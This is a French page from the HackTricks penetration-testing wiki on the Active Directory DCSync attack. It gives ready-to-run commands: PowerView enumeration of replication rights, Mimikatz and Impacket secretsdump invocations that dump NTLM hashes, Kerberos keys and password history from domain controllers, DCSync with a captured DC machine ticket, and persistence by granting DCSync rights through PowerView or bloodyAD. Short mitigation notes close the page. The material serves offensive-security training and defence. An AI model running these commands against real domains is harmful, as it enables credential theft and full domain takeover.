# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

La permission **DCSync** implique de disposer des permissions suivantes sur le domaine lui-même : **DS-Replication-Get-Changes**, **Replicating Directory Changes All** et **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Notes importantes concernant DCSync :**

- L'**attaque DCSync simule le comportement d'un Domain Controller et demande aux autres Domain Controllers de répliquer les informations** à l'aide du Directory Replication Service Remote Protocol (MS-DRSR). Comme MS-DRSR est une fonction valide et nécessaire d'Active Directory, il ne peut pas être désactivé ou neutralisé.
- Par défaut, seuls les groupes **Domain Admins, Enterprise Admins, Administrators et Domain Controllers** disposent des privilèges requis.
- En pratique, un **DCSync complet** nécessite **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** sur le contexte d'appellation du domaine. `DS-Replication-Get-Changes-In-Filtered-Set` est généralement déléguée avec ces permissions, mais seule, elle est davantage pertinente pour synchroniser les **attributs confidentiels / filtrés par un RODC** (par exemple, les secrets de type LAPS legacy) que pour effectuer un dump complet de krbtgt.<sup>[[2]](#references)</sup>
- Si les mots de passe de certains comptes sont stockés avec un chiffrement réversible, une option de Mimikatz permet de retourner le mot de passe en clair.

### Énumération

Vérifiez qui possède ces permissions à l'aide de `powerview` :
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Si vous souhaitez vous concentrer sur les **principals non par défaut** disposant de droits DCSync, excluez les groupes intégrés capables de réplication et examinez uniquement les trustees inattendus :
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploiter localement
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploiter à distance
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Exemples pratiques ciblés :<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync avec le TGT de machine d’un DC capturé (ccache)

Dans les scénarios en mode export avec délégation non contrainte, vous pouvez capturer le TGT de machine d’un Domain Controller (par exemple, `DC1$@DOMAIN` pour `krbtgt@DOMAIN`). Vous pouvez ensuite utiliser ce ccache pour vous authentifier en tant que DC et effectuer un DCSync sans mot de passe.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notes opérationnelles :

- **Le chemin Kerberos d’Impacket passe d’abord par SMB** avant l’appel DRSUAPI. Si l’environnement applique la **validation du nom cible SPN**, un full dump peut échouer avec `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Dans ce cas, demandez d’abord un **ticket de service `cifs/<dc>`** pour le DC cible, ou utilisez **`-just-dc-user`** pour le compte dont vous avez immédiatement besoin.
- Lorsque vous ne disposez que de droits de réplication inférieurs, une synchronisation de type LDAP/DirSync peut tout de même exposer des attributs **confidentiels** ou **filtrés par RODC** (par exemple l’ancien attribut `ms-Mcs-AdmPwd`) sans réplication complète de krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` génère 3 fichiers :

- un contenant les **hashes NTLM**
- un contenant les **clés Kerberos**
- un contenant les mots de passe en clair provenant de NTDS pour tous les comptes dont le paramètre [**chiffrement réversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) est activé. Vous pouvez obtenir les utilisateurs dont le chiffrement réversible est activé avec

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistance

Si vous êtes administrateur de domaine, vous pouvez accorder ces permissions à n’importe quel utilisateur à l’aide de PowerView :<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Les opérateurs Linux peuvent faire de même avec `bloodyAD` :
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Ensuite, vous pouvez **vérifier si les 3 privilèges ont bien été attribués** à l'utilisateur en les recherchant dans la sortie de (vous devriez pouvoir voir les noms des privilèges dans le champ « ObjectType ») :
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- ID d'événement de sécurité 4662 (Audit Policy for object must be enabled) – Une opération a été effectuée sur un objet<sup>[[4]](#references)</sup>
- ID d'événement de sécurité 5136 (Audit Policy for object must be enabled) – Un objet du service d'annuaire a été modifié
- ID d'événement de sécurité 4670 (Audit Policy for object must be enabled) – Les permissions sur un objet ont été modifiées
- AD ACL Scanner - Créer et comparer des rapports d'ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Journal des modifications d'Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync : Exploiter Replication Get-Changes et Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync : Extraire les hashes de mots de passe depuis un Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB : Delegate — Identifiants SYSVOL → Kerberoast ciblé → Unconstrained Delegation → DCSync vers DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
